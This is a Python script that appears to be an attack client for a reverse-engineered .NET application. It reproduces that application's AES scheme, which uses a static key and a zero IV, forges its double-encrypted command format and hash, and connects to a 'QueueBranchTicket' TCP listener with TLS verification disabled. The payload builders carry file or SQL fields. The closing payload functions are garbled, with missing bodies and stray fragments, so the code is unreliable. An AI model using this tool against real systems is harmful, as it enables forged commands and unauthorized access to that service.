# ─────────────────────────────────────────────────────────────────────────────
# AES IMPLEMENTATION (matches ClsEncrypt exactly)
# ─────────────────────────────────────────────────────────────────────────────
def get_key(password: str) -> bytes:
    """
    ClsEncrypt.GetKey (lines 9056-9100):
    - UTF8 byte count < 24 → PadRight(24, char(0x20)) → UTF8 encode
    - UTF8 byte count >= 24 → Substring(0, 24) → UTF8 encode
    Result: always 24 bytes (AES-192).
    """
    pwd_bytes = password.encode("utf-8")
    if len(pwd_bytes) < 24:
        pwd = password.padright(24) if hasattr(password, "padright") else password
        # .NET PadRight pads with spaces (char 0x20)
        pwd = password.ljust(24, " ")
    else:
        pwd = password[:24]
    return pwd.encode("utf-8")


def aes_encrypt(plaintext: str, password: str) -> str:
    """
    ClsEncrypt.Encrypt (lines 9282-9345):
    - key = Nvl(password, KeyStatic) → GetKey() → 24 bytes
    - Mode=CBC, Padding=PKCS7, IV=16 zeros (Aes.Create() default)
    - Input: ASCII bytes → Output: Base64 string
    """
    key_password = password if password else KEY_STATIC
    key = get_key(key_password)
    # ASCII encoding per IL_0048: Encoding.get_ASCII()
    data = plaintext.encode("ascii")
    # PKCS7 padding
    block_size = 16
    pad_len = block_size - (len(data) % block_size)
    data_padded = data + bytes([pad_len] * pad_len)
    cipher = Cipher(algorithms.AES(key), modes.CBC(IV_16_ZERO), backend=default_backend())
    encryptor = cipher.encryptor()
    ct = encryptor.update(data_padded) + encryptor.finalize()
    return base64.b64encode(ct).decode("ascii")


def aes_decrypt(cipher_b64: str, password: str) -> str:
    """
    ClsEncrypt.Decrypt (lines 9347-9414):
    - key = Nvl(password, KeyStatic) → GetKey() → 24 bytes
    - Mode=CBC, Padding=PKCS7, IV=16 zeros
    - Input: Replace(" ", "+") → Base64 decode → Output: UTF8 string
    """
    key_password = password if password else KEY_STATIC
    key = get_key(key_password)
    # IL_0049-IL_0053: data.Replace(" ", "+") before Base64 decode
    cipher_b64 = cipher_b64.replace(" ", "+")
    ct = base64.b64decode(cipher_b64)
    cipher = Cipher(algorithms.AES(key), modes.CBC(IV_16_ZERO), backend=default_backend())
    decryptor = cipher.decryptor()
    padded = decryptor.update(ct) + decryptor.finalize()
    # Remove PKCS7 padding
    pad_len = padded[-1]
    data = padded[:-pad_len]
    return data.decode("utf-8")


# ─────────────────────────────────────────────────────────────────────────────
# DOUBLE ENCRYPT / DECRYPT (matches ProcessDecryptValue, lines 9446-9603)
# ─────────────────────────────────────────────────────────────────────────────
def process_decrypt_value(encrypted_cmd: str) -> str:
    """
    ProcessDecryptValue double-decryption pipeline:
    Input format: firstPart|secondPart
    1. secretKey = firstPart[0:12]
    2. firstDecryptKey = secretKey + KeyStatic
    3. guid = Decrypt(secondPart, firstDecryptKey)
    4. secondDecryptKey = guid + KeyStatic
    5. plaintext = Decrypt(firstPart, secondDecryptKey)
    """
    pipe_idx = encrypted_cmd.index("|")
    first_part = encrypted_cmd[:pipe_idx]
    second_part = encrypted_cmd[pipe_idx + 1:]

    # secretKey = first 12 chars of firstPart
    secret_key = first_part[:12]

    # Double decryption
    first_decrypt_key = secret_key + KEY_STATIC
    guid = aes_decrypt(second_part, first_decrypt_key)
    second_decrypt_key = guid + KEY_STATIC
    plaintext = aes_decrypt(first_part, second_decrypt_key)
    return plaintext


def process_encrypt_value(plaintext: str, guid: str = None) -> str:
    """
    Reverse of ProcessDecryptValue — encrypts a plaintext payload.

    Flow (no circular dependency):
    1. Choose a guid (random if not provided)
    2. firstPart = Encrypt(plaintext, GetKey(guid + KeyStatic))
    3. secretKey = firstPart[0:12]
    4. firstDecryptKey = GetKey(secretKey + KeyStatic)
    5. secondPart = Encrypt(guid, firstDecryptKey)
    6. Result = firstPart + "|" + secondPart
    """
    if guid is None:
        guid = str(uuid.uuid4()).replace("-", "")[:16]

    # Step 2: encrypt plaintext with guid+KeyStatic as key
    first_part = aes_encrypt(plaintext, guid + KEY_STATIC)

    # Step 3: extract secretKey from firstPart
    secret_key = first_part[:12]

    # Step 4-5: encrypt guid with secretKey+KeyStatic as key
    first_decrypt_key = secret_key + KEY_STATIC
    second_part = aes_encrypt(guid, first_decrypt_key)

    return first_part + "|" + second_part


# ─────────────────────────────────────────────────────────────────────────────
# SHA256 (matches ClsEncrypt.GetSha256, lines 9103-9198)
# ─────────────────────────────────────────────────────────────────────────────
def get_sha256(text: str) -> str:
    """UTF8 → SHA256 → uppercase hex string."""
    h = hashlib.sha256(text.encode("utf-8")).hexdigest().upper()
    return h


def hash_secure_file(file_content: str, file_name: str, secret_key: str) -> str:
    """
    ClsUtl.HashSecureFile (lines 16432-16477):
    hashValue = SHA256(fileContent + secretKey + fileName)
    """
    content = file_content + secret_key + file_name
    return get_sha256(content)


# ─────────────────────────────────────────────────────────────────────────────
# TCP / TLS CONNECTION
# ─────────────────────────────────────────────────────────────────────────────
def connect(target: str, port: int, use_tls: bool = True):
    """Connect to QueueBranchTicket TCP listener."""
    raw_sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
    raw_sock.settimeout(10)
    raw_sock.connect((target, port))
    if use_tls:
        ctx = ssl.SSLContext(ssl.PROTOCOL_TLS_CLIENT)
        ctx.check_hostname = False
        ctx.verify_mode = ssl.CERT_NONE
        sock = ctx.wrap_socket(raw_sock, server_hostname=target)
    else:
        sock = raw_sock
    return sock


def send_recv(sock, payload: str) -> str:
    """Send UTF-8 payload, receive UTF-8 response."""
    sock.sendall(payload.encode("utf-8"))
    chunks = []
    while True:
        try:
            data = sock.recv(65536)
            if not data:
                break
            chunks.append(data)
        except socket.timeout:
            break
    return b"".join(chunks).decode("utf-8", errors="replace")

def build_raw_payload(action_type: str, params: str, conn_type: str,
                      file_or_sql: str, secure_hash: str, user_id: str) -> str:

    Plaintext payload format (before encryption):

def build_encrypted_payload(action_type: str, params: str, conn_type: str,
                            file_or_sql: str, secure_hash: str, user_id: str) -> str:

                                  file_or_sql, secure_hash, user_id)
